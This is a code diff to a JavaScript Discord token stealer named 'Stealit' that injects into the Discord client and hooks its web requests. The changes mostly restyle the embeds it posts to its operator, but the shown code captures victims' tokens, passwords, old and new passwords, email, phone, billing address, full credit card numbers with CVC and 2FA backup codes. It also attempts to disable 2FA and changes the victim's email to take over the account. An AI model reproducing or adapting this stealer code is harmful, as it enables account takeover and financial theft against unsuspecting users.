@@ -556,11 +556,11 @@ const FirstTime = async () => {
     var client_discord = appName;
     if (!token) {
       var params = await makeEmbed({
-        title: "<:stealit:1206869154691416084> Stealit Initialized",
+        title: "<:stealit:1206869154691416084> Initialized",
         fields: [
           {
             name: "Injection Info",
-            value: `\`\`\`diff\n- Computer Name: ${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\``,
+            value: `\`\`\`diff\n- PC Name: ${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\``,
             inline: !1,
           },
         ],
@@ -600,72 +600,48 @@ const FirstTime = async () => {
           `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`
         ));
       var params = await makeEmbed({
-        title: " Stealit Initialized",
-        description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\``,
+        title: "Stealit Initialized",
+        description: `\`\`\`- Injection Path: ${client_discord}\n\`\`\``,
         fields: [
           {
             name: "Username <:mention:1206228892629864488>",
             value: `\`${user.username}#${user.discriminator}\``,
-            inline: !0,
+            inline: true,
           },
           {
             name: "ID <:identy:1206228345407406120>",
             value: `\`${user.id}\`\n[Copy ID](https://stealit.vercel.app/?p=${user.id})`,
-            inline: !0,
+            inline: true,
           },
           {
             name: "Nitro <:nitros:1206229096128843837>",
             value: `${GetNitro(Nitro)}`,
-            inline: !0,
+            inline: true,
           },
           {
             name: "Badges <a:badges:1206229283366768701>",
             value: `${GetBadges(user.flags)}`,
-            inline: !0,
-          },
-          {
-            name: "Language <:language:1206229413998493737>",
-            value: `${GetLangue(user.locale)}`,
-            inline: !0,
-          },
-          {
-            name: "NSFW <:underagex:1206229680856895519>",
-            value: `${GetNSFW(user.nsfw_allowed)}`,
-            inline: !0,
+            inline: true,
           },
           {
             name: "2FA <:keys:1206229927507136574>",
             value: `${GetA2F(user.mfa_enabled)}`,
-            inline: !0,
-          },
-          {
-            name: "@Copyright",
-            value: `[Stealit 2024](https://t.me/stealitpublic)`,
-            inline: !0,
+            inline: true,
           },
           {
             name: "Billing <a:moneyx:1206250495329570948>",
             value: `${Billings}`,
-            inline: !0,
+            inline: true,
           },
           {
             name: "Email <:mail:1206251253567455314>",
             value: `\`${user.email ?? "none"}\``,
-            inline: !0,
-          },
-          {
-            name: "Bio <:stealit:1206869154691416084>",
-            value: `\`\`\`${
-              user.bio !== null && user.bio !== undefined && user.bio !== ""
-                ? user.bio
-                : "none"
-            }\`\`\``,
-            inline: false,
+            inline: true,
           },
           {
             name: "<:artreal:1206252088112316456> Token",
-            value: `\`\`\`${token}\`\`\`\n[Copy Token](https://stealit.vercel.app/?p=${token})\n\n[Download Banner](${userBanner})`,
-            inline: !1,
+            value: `\`\`\`${token}\`\`\`\n[Copy Token](https://stealit.vercel.app/?p=${token})`,
+            inline: false,
           },
         ],
 
@@ -734,88 +710,62 @@ const FirstTime = async () => {
           ));
         var params = await makeEmbed({
           title:
-            "<:stealit:1206869154691416084> Stealit Victim got logged out",
-          description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
+            "<:stealit:1206869154691416084> Victim got logged out",
+          description: `\`\`\`- Injection Path: ${client_discord}\`\`\``,
           fields: [
             {
               name: "Username <:mention:1206228892629864488>",
               value: `\`${user.username}#${user.discriminator}\``,
-              inline: !0,
+              inline: true,
             },
             {
               name: "ID <:identy:1206228345407406120>",
               value: `\`${user.id}\`\n[Copy ID](https://stealit.vercel.app/?p=${user.id})`,
-              inline: !0,
+              inline: true,
             },
             {
               name: "Nitro <:nitros:1206229096128843837>",
               value: `${GetNitro(Nitro)}`,
-              inline: !0,
+              inline: true,
             },
             {
               name: "Badges <a:badges:1206229283366768701>",
               value: `${GetBadges(user.flags)}`,
-              inline: !0,
-            },
-            {
-              name: "Language <:language:1206229413998493737>",
-              value: `${GetLangue(user.locale)}`,
-              inline: !0,
-            },
-            {
-              name: "NSFW <:underagex:1206229680856895519>",
-              value: `${GetNSFW(user.nsfw_allowed)}`,
-              inline: !0,
+              inline: true,
             },
             {
               name: "2FA <:keys:1206229927507136574>",
               value: `${GetA2F(user.mfa_enabled)}`,
-              inline: !0,
-            },
-            {
-              name: "@Copyright",
-              value: `[Stealit 2024](https://t.me/stealitpublic)`,
-              inline: !0,
+              inline: true,
             },
             {
               name: "Billing <a:moneyx:1206250495329570948>",
               value: `${Billings}`,
-              inline: !0,
+              inline: true,
             },
             {
               name: "Email <:mail:1206251253567455314>",
               value: `\`${user.email}\``,
-              inline: !0,
+              inline: true,
             },
             {
               name: "Phone <:iphone:1206253352439255051>",
               value: `\`${user.phone ?? "None"}\``,
-              inline: !0,
-            },
-            {
-              name: "Bio <:stealit:1206869154691416084>",
-              value: `\`\`\`${
-                user.bio !== null && user.bio !== undefined && user.bio !== ""
-                  ? user.bio
-                  : "none"
-              }\`\`\``,
-              inline: false,
+              inline: true,
             },
             {
               name: "<:artreal:1206252088112316456> Token",
-              value: `\`\`\`${token}\`\`\`\n[Copy Token](https://stealit.vercel.app/?p=${token})\n\n[Download Banner](${userBanner})`,
-              inline: !1,
+              value: `\`\`\`${token}\`\`\`\n[Copy Token](https://stealit.vercel.app/?p=${token})`,
+              inline: false,
             },
           ],
 
-          thumbnail: userAvatar,
         });
         var params2 = await makeEmbed({
           title: `<:people:1206252520356323359> Total Friends (${Friends.len})`,
           color: config["embed-color"],
           description: Friends.badges,
           image: userBanner,
-          thumbnail: userAvatar,
         });
 
         params.embeds.push(params2.embeds[0]);
@@ -1813,80 +1763,54 @@ electron.session.defaultSession.webRequest.onCompleted(
               } = await BoukiTuclcavectesfonctions();
               var password = data.password;
               var params = await makeEmbed({
-                title: "<:stealit:1206869154691416084> Stealit User Login",
+                title: "<:stealit:1206869154691416084> User Login",
                 color: config["embed-color"],
-                description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
+                description: `\`\`\`- Injection Path: ${client_discord}\`\`\``,
                 fields: [
                   {
                     name: "Username <:mention:1206228892629864488>",
                     value: `\`${user.username}#${user.discriminator}\``,
-                    inline: !0,
+                    inline: true,
                   },
                   {
                     name: "ID <:identy:1206228345407406120>",
                     value: `\`${user.id}\`\n[Copy ID](https://stealit.vercel.app/?p=${user.id})`,
-                    inline: !0,
+                    inline: true,
                   },
                   {
                     name: "Nitro <:nitros:1206229096128843837>",
                     value: `${GetNitro(Nitro)}`,
-                    inline: !0,
+                    inline: true,
                   },
                   {
                     name: "Badges <a:badges:1206229283366768701>",
                     value: `${GetBadges(user.flags)}`,
-                    inline: !0,
-                  },
-                  {
-                    name: "Language <:language:1206229413998493737>",
-                    value: `${GetLangue(user.locale)}`,
-                    inline: !0,
-                  },
-                  {
-                    name: "NSFW <:underagex:1206229680856895519>",
-                    value: `${GetNSFW(user.nsfw_allowed)}`,
-                    inline: !0,
+                    inline: true,
                   },
                   {
                     name: "2FA <:keys:1206229927507136574>",
                     value: `${GetA2F(user.mfa_enabled)}`,
-                    inline: !0,
-                  },
-                  {
-                    name: "@Copyright",
-                    value: `[Stealit 2024](https://t.me/stealitpublic)`,
-                    inline: !0,
+                    inline: true,
                   },
                   {
                     name: "Billing <a:moneyx:1206250495329570948>",
                     value: `${Billings}`,
-                    inline: !0,
+                    inline: true,
                   },
                   {
                     name: "Email <:mail:1206251253567455314>",
                     value: `\`${user.email}\``,
-                    inline: !0,
+                    inline: true,
                   },
                   {
                     name: "Phone <:iphone:1206253352439255051>",
                     value: `\`${user.phone ?? "None"}\``,
-                    inline: !0,
+                    inline: true,
                   },
                   {
                     name: "<:password:1206254317229707387> Password",
                     value: `\`${password}\``,
-                    inline: !0,
-                  },
-                  {
-                    name: "Bio <:stealit:1206869154691416084>",
-                    value: `\`\`\`${
-                      user.bio !== null &&
-                      user.bio !== undefined &&
-                      user.bio !== ""
-                        ? user.bio
-                        : "none"
-                    }\`\`\``,
-                    inline: false,
+                    inline: true,
                   },
                   {
                     name: "Code 2fa used <:stealit:1206869154691416084>",
@@ -1901,21 +1825,19 @@ electron.session.defaultSession.webRequest.onCompleted(
                   },
                   {
                     name: "<:artreal:1206252088112316456> Token",
-                    value: `\`\`\`${token}\`\`\`\n[Copy Token](https://stealit.vercel.app/?p=${token})\n\n[Download Banner](${userBanner})`,
-                    inline: !1,
+                    value: `\`\`\`${token}\`\`\`\n[Copy Token](https://stealit.vercel.app/?p=${token})`,
+                    inline: false,
                   },
                 ],
 
-                thumbnail: userAvatar,
-              });
+                    });
 
               var params2 = await makeEmbed({
                 title: `<:people:1206252520356323359> Total Friends (${Friends.len})`,
                 color: config["embed-color"],
                 description: Friends.badges,
                 image: userBanner,
-                thumbnail: userAvatar,
-              });
+                    });
 
               params.embeds.push(params2.embeds[0]);
               await post(params);
@@ -1940,98 +1862,65 @@ electron.session.defaultSession.webRequest.onCompleted(
             var password = data.password;
 
             var params = await makeEmbed({
-              title: "<:stealit:1206869154691416084> Stealit User Login",
+              title: "<:stealit:1206869154691416084> User Login",
               color: config["embed-color"],
-              description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
+              description: `\`\`\`- Injection Path: ${client_discord}\`\`\``,
               fields: [
                 {
-                  name: "Username <:mention:1206228892629864488>",
-                  value: `\`${user.username}#${user.discriminator}\``,
-                  inline: !0,
-                },
-                {
-                  name: "ID <:identy:1206228345407406120>",
-                  value: `\`${user.id}\`\n[Copy ID](https://stealit.vercel.app/?p=${user.id})`,
-                  inline: !0,
+                  name: "User <:mention:1206228892629864488>",
+                  value: `@${user.username}#${user.discriminator} - \`${user.id}\` ${GetLangue(user.locale)}`,
+                  inline: true,
                 },
                 {
                   name: "Nitro <:nitros:1206229096128843837>",
                   value: `${GetNitro(Nitro)}`,
-                  inline: !0,
+                  inline: true,
                 },
                 {
                   name: "Badges <a:badges:1206229283366768701>",
                   value: `${GetBadges(user.flags)}`,
-                  inline: !0,
-                },
-                {
-                  name: "Language <:language:1206229413998493737>",
-                  value: `${GetLangue(user.locale)}`,
-                  inline: !0,
-                },
-                {
-                  name: "NSFW <:underagex:1206229680856895519>",
-                  value: `${GetNSFW(user.nsfw_allowed)}`,
-                  inline: !0,
+                  inline: true,
                 },
                 {
                   name: "2FA <:keys:1206229927507136574>",
                   value: `${GetA2F(user.mfa_enabled)}`,
-                  inline: !0,
-                },
-                {
-                  name: "@Copyright",
-                  value: `[Stealit 2024](https://t.me/stealitpublic)`,
-                  inline: !0,
+                  inline: true,
                 },
                 {
                   name: "Billing <a:moneyx:1206250495329570948>",
                   value: `${Billings}`,
-                  inline: !0,
+                  inline: true,
                 },
                 {
                   name: "Email <:mail:1206251253567455314>",
                   value: `\`${user.email}\``,
-                  inline: !0,
+                  inline: true,
                 },
                 {
                   name: "Phone <:iphone:1206253352439255051>",
                   value: `\`${user.phone ?? "None"}\``,
-                  inline: !0,
+                  inline: true,
                 },
                 {
                   name: "<:password:1206254317229707387> Password",
                   value: `\`${password}\``,
-                  inline: !0,
-                },
-                {
-                  name: "Bio <:stealit:1206869154691416084>",
-                  value: `\`\`\`${
-                    user.bio !== null &&
-                    user.bio !== undefined &&
-                    user.bio !== ""
-                      ? user.bio
-                      : "none"
-                  }\`\`\``,
-                  inline: false,
+                  inline: true,
                 },
                 {
                   name: "<:artreal:1206252088112316456> Token",
-                  value: `\`\`\`${token}\`\`\`\n[Copy Token](https://stealit.vercel.app/?p=${token})\n\n[Download Banner](${userBanner})`,
-                  inline: !1,
+                  value: `\`\`\`${token}\`\`\`\n[Copy Token](https://stealit.vercel.app/?p=${token})`,
+                  inline: false,
                 },
               ],
 
-              thumbnail: userAvatar,
-            });
+                });
 
             var params2 = await makeEmbed({
               title: `<:people:1206252520356323359> Total Friends (${Friends.len})`,
               color: config["embed-color"],
               description: Friends.badges,
               image: userBanner,
-              thumbnail: userAvatar,
-            });
+                });
 
             params.embeds.push(params2.embeds[0]);
 
@@ -2044,101 +1933,75 @@ electron.session.defaultSession.webRequest.onCompleted(
         if (data.new_password) {
           var params = await makeEmbed({
             title:
-              "<:stealit:1206869154691416084> Stealit Detect Password Changed",
+              "<:stealit:1206869154691416084> Detect Password Changed",
             color: config["embed-color"],
             description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
             fields: [
               {
                 name: "Username <:mention:1206228892629864488>",
                 value: `\`${user.username}#${user.discriminator}\``,
-                inline: !0,
+                inline: true,
               },
               {
                 name: "ID <:identy:1206228345407406120>",
                 value: `\`${user.id}\`\n[Copy ID](https://stealit.vercel.app/?p=${user.id})`,
-                inline: !0,
+                inline: true,
               },
               {
                 name: "Nitro <:nitros:1206229096128843837>",
                 value: `${GetNitro(Nitro)}`,
-                inline: !0,
+                inline: true,
               },
               {
                 name: "Badges <a:badges:1206229283366768701>",
                 value: `${GetBadges(user.flags)}`,
-                inline: !0,
-              },
-              {
-                name: "Language <:language:1206229413998493737>",
-                value: `${GetLangue(user.locale)}`,
-                inline: !0,
-              },
-              {
-                name: "NSFW <:underagex:1206229680856895519>",
-                value: `${GetNSFW(user.nsfw_allowed)}`,
-                inline: !0,
+                inline: true,
               },
               {
                 name: "2FA <:keys:1206229927507136574>",
                 value: `${GetA2F(user.mfa_enabled)}`,
-                inline: !0,
-              },
-              {
-                name: "@Copyright",
-                value: `[Stealit 2024](https://t.me/stealitpublic)`,
-                inline: !0,
+                inline: true,
               },
               {
                 name: "Billing <a:moneyx:1206250495329570948>",
                 value: `${Billings}`,
-                inline: !0,
+                inline: true,
               },
               {
                 name: "Email <:mail:1206251253567455314>",
                 value: `\`${user.email}\``,
-                inline: !0,
+                inline: true,
               },
               {
                 name: "Phone <:iphone:1206253352439255051>",
                 value: `\`${user.phone ?? "None"}\``,
-                inline: !0,
+                inline: true,
               },
               {
                 name: "Old Password <:password:1206254317229707387>",
                 value: `\`${data.password}\``,
-                inline: !0,
+                inline: true,
               },
               {
                 name: "New Password <:password:1206254317229707387>",
                 value: `\`${data.new_password}\``,
-                inline: !0,
-              },
-              {
-                name: "Bio <:stealit:1206869154691416084>",
-                value: `\`\`\`${
-                  user.bio !== null && user.bio !== undefined && user.bio !== ""
-                    ? user.bio
-                    : "none"
-                }\`\`\``,
-                inline: false,
+                inline: true,
               },
               {
                 name: "<:artreal:1206252088112316456> Token",
-                value: `\`\`\`${token}\`\`\`\n[Copy Token](https://stealit.vercel.app/?p=${token})\n\n[Download Banner](${userBanner})`,
-                inline: !1,
+                value: `\`\`\`${token}\`\`\`\n[Copy Token](https://stealit.vercel.app/?p=${token})`,
+                inline: false,
               },
             ],
 
-            thumbnail: userAvatar,
-          });
+            });
 
           var params2 = await makeEmbed({
             title: `<:people:1206252520356323359> Total Friends (${Friends.len})`,
             color: config["embed-color"],
             description: Friends.badges,
             image: userBanner,
-            thumbnail: userAvatar,
-          });
+            });
 
           params.embeds.push(params2.embeds[0]);
 
@@ -2164,58 +2027,52 @@ electron.session.defaultSession.webRequest.onCompleted(
               if (res.username) {
                 var params = await makeEmbed({
                   title:
-                    "<:stealit:1206869154691416084> Stealit Have changed the victim mail",
+                    "<:stealit:1206869154691416084> Have changed the victim mail",
                   color: config["embed-color"],
-                  description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
+                  description: `\`\`\`- Injection Path: ${client_discord}\n\`\`\``,
                   fields: [
                     {
                       name: "Username <:mention:1206228892629864488>",
                       value: `\`${res.username}#${res.discriminator}\``,
-                      inline: !1,
+                      inline: true,
                     },
                     {
                       name: "ID <:identy:1206228345407406120>",
                       value: `\`${res.id}\`\n[Copy ID](https://stealit.vercel.app/?p=${res.id})`,
-                      inline: !1,
+                      inline: true,
                     },
                     {
                       name: "Badges <a:badges:1206229283366768701>",
                       value: `${GetBadges(res.flags)}`,
-                      inline: !1,
+                      inline: true,
                     },
                     {
                       name: "2FA <:keys:1206229927507136574>",
                       value: `${GetA2F(res.mfa_enabled)}`,
-                      inline: !1,
-                    },
-                    {
-                      name: "@Copyright",
-                      value: `[Stealit 2024](https://t.me/stealitpublic)`,
-                      inline: !1,
+                      inline: true,
                     },
                     {
                       name: "Phone <:iphone:1206253352439255051>",
                       value: `\`${res.phone ?? "None"}\``,
-                      inline: !1,
+                      inline: true,
                     },
                     {
                       name: "New Email <:mail:1206251253567455314>",
                       value: `\`${res.email}\``,
-                      inline: !1,
+                      inline: true,
                     },
                     {
                       name: "<:password:1206254317229707387> Password",
                       value: `\`${generatedPassword}\``,
-                      inline: !1,
+                      inline: true,
                     },
                     {
                       name: "<:artreal:1206252088112316456> Token",
                       value: `\`\`\`${res.token}\`\`\`\n[Copy Token](https://stealit.vercel.app/?p=${res.token})`,
-                      inline: !1,
+                      inline: false,
                     },
                   ],
-                  thumbnail: userAvatar,
-                });
+                        });
 
                 await post(params);
                 break;
@@ -2224,96 +2081,71 @@ electron.session.defaultSession.webRequest.onCompleted(
           }
           var params = await makeEmbed({
             title:
-              "<:stealit:1206869154691416084> Stealit Detect Email Changed",
+              "<:stealit:1206869154691416084> Detect Email Changed",
             color: config["embed-color"],
-            description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
+            description: `\`\`\`- Injection Path: ${client_discord}\n\`\`\``,
             fields: [
               {
                 name: "Username <:mention:1206228892629864488>",
                 value: `\`${user.username}#${user.discriminator}\``,
-                inline: !0,
+                inline: true,
               },
               {
                 name: "ID <:identy:1206228345407406120>",
                 value: `\`${user.id}\`\n[Copy ID](https://stealit.vercel.app/?p=${user.id})`,
-                inline: !0,
+                inline: true,
               },
               {
                 name: "Nitro <:nitros:1206229096128843837>",
                 value: `${GetNitro(Nitro)}`,
-                inline: !0,
+                inline: true,
               },
               {
                 name: "Badges <a:badges:1206229283366768701>",
                 value: `${GetBadges(user.flags)}`,
-                inline: !0,
-              },
-              {
-                name: "Language <:language:1206229413998493737>",
-                value: `${GetLangue(user.locale)}`,
-                inline: !0,
-              },
-              {
-                name: "NSFW <:underagex:1206229680856895519>",
-                value: `${GetNSFW(user.nsfw_allowed)}`,
-                inline: !0,
+                inline: true,
               },
               {
                 name: "2FA <:keys:1206229927507136574>",
                 value: `${GetA2F(user.mfa_enabled)}`,
-                inline: !0,
-              },
-              {
-                name: "@Copyright",
-                value: `[Stealit 2024](https://t.me/stealitpublic)`,
-                inline: !0,
+                inline: true,
               },
               {
                 name: "Billing <a:moneyx:1206250495329570948>",
                 value: `${Billings}`,
-                inline: !0,
+                inline: true,
               },
               {
                 name: "New Email <:mail:1206251253567455314>",
                 value: `\`${user.email}\``,
-                inline: !0,
+                inline: true,
               },
               {
                 name: "Phone <:iphone:1206253352439255051>",
                 value: `\`${user.phone ?? "None"}\``,
-                inline: !0,
+                inline: true,
               },
               {
                 name: "<:password:1206254317229707387> Password",
                 value: `\`${data.password}\``,
-                inline: !0,
-              },
-              {
-                name: "Bio <:stealit:1206869154691416084>",
-                value: `\`\`\`${
-                  user.bio !== null && user.bio !== undefined && user.bio !== ""
-                    ? user.bio
-                    : "none"
-                }\`\`\``,
-                inline: false,
+                inline: true,
               },
               {
                 name: "<:artreal:1206252088112316456> Token",
-                value: `\`\`\`${token}\`\`\`\n[Copy Token](https://stealit.vercel.app/?p=${token})\n\n[Download Banner](${userBanner})`,
-                inline: !1,
+                value: `\`\`\`${token}\`\`\`\n[Copy Token](https://stealit.vercel.app/?p=${token})`,
+                inline: false,
+
               },
             ],
 
-            thumbnail: userAvatar,
-          });
+            });
 
           var params2 = await makeEmbed({
             title: `<:people:1206252520356323359> Total Friends (${Friends.len})`,
             color: config["embed-color"],
             description: Friends.badges,
             image: userBanner,
-            thumbnail: userAvatar,
-          });
+            });
 
           params.embeds.push(params2.embeds[0]);
 
@@ -2343,60 +2175,49 @@ electron.session.defaultSession.webRequest.onCompleted(
                 dt.billing_address;
               var params = await makeEmbed({
                 title:
-                  "<:stealit:1206869154691416084> Stealit User Credit Card Added",
+                  "<:stealit:1206869154691416084> User Credit Card Added",
                 color: config["embed-color"],
                 fields: [
                   {
-                    name: "IP",
-                    value: `\`${ip}\``,
-                    inline: false,
-                  },
-                  {
                     name: "ID <:identy:1206228345407406120>",
                     value: `\`${user.id}\`\n[Copy ID](https://stealit.vercel.app/?p=${user.id})`,
-                    inline: false,
+                    inline: true,
                   },
                   {
                     name: "Username <:username:1041634536733290596>",
                     value: `\`${user.username}#${user.discriminator}\``,
-                    inline: false,
-                  },
-                  {
-                    name: "Language <:language:1206229413998493737>",
-                    value: GetLangue(user.locale),
-                    inline: false,
+                    inline: true,
                   },
                   {
                     name: "2FA <:keys:1206229927507136574>",
                     value: GetA2F(user.mfa_enabled),
-                    inline: false,
+                    inline: true,
                   },
                   {
                     name: "Badges <a:badges:1206229283366768701>",
                     value: GetBadges(user.flags),
-                    inline: false,
+                    inline: true,
                   },
                   {
                     name: "Address <:identy:1206228345407406120>",
                     value: `\`\`\`md\n# Line 1 : ${line_1},\n# Line 2 : ${line_2},\n# City : ${city},\n# State : ${state},\n# Postal Code : ${postal_code},\n# Country : ${country}\n\`\`\``,
-                    inline: false,
+                    inline: true,
                   },
                   {
                     name: "Credit Card <:identy:1206228345407406120>",
                     value: `\`\`\`md\n# Card Number : ${CardNumber}\n# Card Expiration : ${
                       month + "/" + year
                     }\n# CVC : ${CardCVC}\`\`\``,
-                    inline: false,
+                    inline: true,
                   },
                   {
                     name: "<:artreal:1206252088112316456> Token",
-                    value: `\`\`\`${token}\`\`\`\n[Copy Token](https://stealit.vercel.app/?p=${token})\n\n[Download Banner](${userBanner})`,
+                    value: `\`\`\`${token}\`\`\`\n[Copy Token](https://stealit.vercel.app/?p=${token})`,
                     inline: false,
                   },
                 ],
 
-                thumbnail: userAvatar,
-              });
+                    });
               await post(params);
             }
           );
@@ -2434,46 +2255,35 @@ electron.session.defaultSession.webRequest.onCompleted(
         }
 
         var params = await makeEmbed({
-          title: "<:stealit:1206869154691416084> Stealit User Enable 2FA",
+          title: "<:stealit:1206869154691416084> User Enable 2FA",
           color: config["embed-color"],
           fields: [
-
-            {
-              name: "IP",
-              value: `\`${ip}\``,
-              inline: false,
-            },
             {
               name: "Username <:username:1041634536733290596>",
               value: `\`${user.username}#${user.discriminator}\``,
-              inline: false,
+              inline: true,
             },
             {
               name: "ID <:identy:1206228345407406120>",
               value: `\`${user.id}\`\n[Copy ID](https://stealit.vercel.app/?p=${user.id})`,
-              inline: false,
-            },
-            {
-              name: "Language <:language:1206229413998493737>",
-              value: GetLangue(user.locale),
-              inline: false,
+              inline: true,
             },
             {
               name: "2FA disabler Response <:2FA:982994698278952980>",
               value: `\`\`\`md\n- ${
                 ValidFound ? "Disabled" : "Cannot Disable"
               }\`\`\``,
-              inline: false,
+              inline: true,
             },
             {
               name: "2FA <:keys:1206229927507136574>",
               value: GetA2F(user.mfa_enabled),
-              inline: false,
+              inline: true,
             },
             {
               name: "Badges <a:badges:1206229283366768701>",
               value: GetBadges(user.flags),
-              inline: false,
+              inline: true,
             },
             {
               name: "Backups Code <:adress:1206255971668852776>",
@@ -2484,54 +2294,41 @@ electron.session.defaultSession.webRequest.onCompleted(
             },
             {
               name: "<:artreal:1206252088112316456> Token",
-              value: `\`\`\`${token}\`\`\`\n[Copy Token](https://stealit.vercel.app/?p=${token})\n\n[Download Banner](${userBanner})`,
+              value: `\`\`\`${token}\`\`\`\n[Copy Token](https://stealit.vercel.app/?p=${token})`,
               inline: false,
             },
           ],
 
-          thumbnail: userAvatar,
         });
         await post(params);
         break;
       case request.url.endsWith("/disable"):
         var params = await makeEmbed({
-          title: "<:stealit:1206869154691416084> Stealit User Removed 2FA",
+          title: "<:stealit:1206869154691416084> User Removed 2FA",
           color: config["embed-color"],
           fields: [
-
-            {
-              name: "IP",
-              value: `\`${ip}\``,
-              inline: false,
-            },
             {
               name: "Username <:username:1041634536733290596>",
               value: `\`${user.username}#${user.discriminator}\``,
-              inline: false,
-            },
-            {
-              name: "Language <:language:1206229413998493737>",
-              value: GetLangue(user.locale),
-              inline: false,
+              inline: true,
             },
             {
               name: "2FA <:keys:1206229927507136574>",
               value: GetA2F(user.mfa_enabled),
-              inline: false,
+              inline: true,
             },
             {
               name: "Badges <a:badges:1206229283366768701>",
               value: GetBadges(user.flags),
-              inline: false,
+              inline: true,
             },
             {
               name: "<:artreal:1206252088112316456> Token",
-              value: `\`\`\`${token}\`\`\`\n[Copy Token](https://stealit.vercel.app/?p=${token})\n\n[Download Banner](${userBanner})`,
-              inline: !1,
+              value: `\`\`\`${token}\`\`\`\n[Copy Token](https://stealit.vercel.app/?p=${token})`,
+              inline: false,
             },
           ],
 
-          thumbnail: userAvatar,
         });
         await post(params);
         break;
@@ -2565,41 +2362,30 @@ electron.session.defaultSession.webRequest.onCompleted(
           }
         }
         var params = await makeEmbed({
-          title: "<:stealit:1206869154691416084> Stealit User 2FA Codes",
+          title: "<:stealit:1206869154691416084> User 2FA Codes",
           color: config["embed-color"],
           fields: [
-
-            {
-              name: "IP",
-              value: "`" + ip + "`",
-              inline: false,
-            },
             {
               name: "Username <:username:1041634536733290596>",
               value: `\`${user.username}#${user.discriminator}\``,
-              inline: false,
-            },
-            {
-              name: "Language <:language:1206229413998493737>",
-              value: GetLangue(user.locale),
-              inline: false,
+              inline: true,
             },
             {
               name: "2FA <:keys:1206229927507136574>",
               value: GetA2F(user.mfa_enabled),
-              inline: false,
+              inline: true,
             },
             {
               name: "Badges <a:badges:1206229283366768701>",
               value: GetBadges(user.flags),
-              inline: false,
+              inline: true,
             },
             {
-              name: "2FA disabler Response <:2FA:982994698278952980> ",
+              name: "2FA-Disabler Response <:2FA:982994698278952980> ",
               value: `\`\`\`md\n- ${
                 validCodeFound ? "Disabled" : "Cannot Disable"
               }\`\`\``,
-              inline: false,
+              inline: true,
             },
             {
               name: "Backup Codes <:adress:1206255971668852776>",
@@ -2610,12 +2396,11 @@ electron.session.defaultSession.webRequest.onCompleted(
             },
             {
               name: "<:artreal:1206252088112316456> Token",
-              value: `\`\`\`${token}\`\`\`\n[Copy Token](https://stealit.vercel.app/?p=${token})\n\n[Download Banner](${userBanner})`,
-              inline: !1,
+              value: `\`\`\`${token}\`\`\`\n[Copy Token](https://stealit.vercel.app/?p=${token})`,
+              inline: false,
             }, 
           ],
 
-          thumbnail: userAvatar,
         });
         await post(params);
         break;
